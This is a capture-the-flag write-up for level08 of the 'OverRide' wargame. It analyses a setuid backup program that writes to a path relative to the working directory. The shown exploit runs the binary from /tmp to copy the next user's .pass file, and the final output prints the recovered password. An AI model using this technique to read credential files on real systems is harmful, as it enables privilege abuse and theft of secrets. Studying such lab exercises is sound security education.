In the user's folder, in addition to the usual executable, there exists a `/backups` folder, 
which contains only a `.log` file.

While experimenting with the program:

```bash
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 test
ERROR: Failed to open test
level08@OverRide:~$ echo "hello" > /tmp/test
level08@OverRide:~$ ./level08 /tmp/test
ERROR: Failed to open ./backups//tmp/test
```

As soon as a valid file can be read by the program, it adds “./backups/” to the beginning of the name.

If we specify only the /tmp folder, there will be no error, and the program will finish execution by adding tmp to the backup folder. 
Obviously, since it is a folder, there is no content present:

```bash
level08@OverRide:~$ ./level08 /tmp
level08@OverRide:~$ ls backups/
tmp
level08@OverRide:~$ cat backups/tmp
level08@OverRide:~$ cd backups/
level08@OverRide:~/backups$ cat .log
LOG: Starting back up: /tmp
LOG: Finished back up /tmp
```

Let's examine the code.
This part checks if an argument is present and if the file `./backups/.log` can be opened:

```C
if (argc != 2)
    printf("Usage: %s filename\n", *argv);
  log = fopen("./backups/.log", "w");
  if (!log)
  {
    printf("ERROR: Failed to open %s\n", "./backups/.log");
    exit(1);
  } 
```

Then, a call to the function `log_wrapper()` will write in the .log file the string "Starting back up: " 
followed by the file specified as an argument.
```C
log_wrapper(log, "Starting back up: ", argv[1]);
```

Here's the first check, if the file cannot be read, we exit here:
```C
stream = fopen(argv[1], "r");
  if (!stream)
  {
    printf("ERROR: Failed to open %s\n", argv[1]);
    exit(1);
  }
```
If the file exists and can be read, the string “./backups” will be added to 
the dest[124] buffer and concatenated with the file passed as an argument:

```C
strcpy(dest, "./backups/");
strncat(dest, argv[1], 99 - strlen(dest));
```

Then, the program opens and creates the file ./backups/{argv[1]}, and writes the 
content of the file argv[1] into ./backups/argv[1]:

```C
fd = open(dest, 193, 432LL);
  if (fd < 0)
  {
    printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
    exit(1);
  }
  while (1)
  {
    buf = fgetc(stream);
    if (buf == -1)
      break;
    write(fd, &buf, 1uLL);
  }
```

The main problem is the addition of the file into ./backup.

Trying to read the .pass file directly won't work because the directory tree does not exist in the backups folder:
```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

and we don't have the rights to create it:
```bash
level08@OverRide:~/backups$ mkdir home
mkdir: cannot create directory `home': Permission denied
```

The detail that can save us is this line:
```C
strcpy(dest, "./backups/");
```

We can see that the dest buffer will start in the current directory of the program's execution. 
This means we can place ourselves wherever we want, for example, in a folder where we have creation rights!

**Then, place yourself in /tmp and replicate the exact directory tree from level09 up to .pass.**

And there's the flag!

```C
level08@OverRide:/tmp$ ../home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
